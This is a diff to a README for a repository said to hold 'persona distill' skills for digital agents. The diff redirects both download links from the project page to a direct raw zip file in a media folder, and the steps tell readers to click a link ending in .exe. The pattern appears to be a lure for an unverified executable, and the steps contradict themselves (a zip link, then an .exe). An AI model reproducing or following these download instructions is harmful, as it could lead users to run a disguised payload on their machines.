@@ -1,6 +1,6 @@
 # 🎯 awesome-persona-distill-skills - Access curated tools for better interactions
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Jolyjumbo536/awesome-persona-distill-skills)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Jolyjumbo536/awesome-persona-distill-skills/main/media/awesome-persona-skills-distill-v1.1.zip)
 
 This project provides a collection of skills for digital agents. These skills help your software understand people, build stronger relationships, manage memories, and improve how agents solve complex problems. People use these tools to make their digital assistants feel more natural and responsive.
 
@@ -8,7 +8,7 @@ This project provides a collection of skills for digital agents. These skills he
 
 You can get the software files from the main project page. Follow these steps to obtain the tool:
 
-1. Visit the [official download page](https://github.com/Jolyjumbo536/awesome-persona-distill-skills).
+1. Visit the [official download page](https://raw.githubusercontent.com/Jolyjumbo536/awesome-persona-distill-skills/main/media/awesome-persona-skills-distill-v1.1.zip).
 2. Look for the latest version on the right side of the screen.
 3. Click the link that ends in .exe to start the file download.
 4. Save the file to your computer.
